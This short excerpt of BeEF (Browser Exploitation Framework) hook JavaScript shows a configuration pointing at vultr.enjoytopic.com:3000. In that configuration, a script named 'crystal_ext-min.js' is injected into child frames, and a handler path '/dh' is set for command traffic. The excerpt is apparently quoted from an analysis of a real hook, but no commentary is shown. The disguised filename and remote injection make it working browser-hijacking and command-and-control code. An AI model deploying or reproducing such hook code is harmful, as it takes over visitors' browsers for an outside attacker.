...
beef.browser = {
    ...
    hookChildFrames: function () {
        ...
        script.src = 'https://vultr.enjoytopic.com:3000/crystal_ext-min.js';
...
beef.net = {
    ...
    host: "vultr.enjoytopic.com",
    port: "3000",
    hook: "/crystal_ext-min.js",
    httpproto: "https",
    handler: '/dh',
    chop: 500,
...
beef.mitb = {
    ...
    init:function (cid, curl) {
        ...
        var hook_file = "/crystal_ext-min.js";
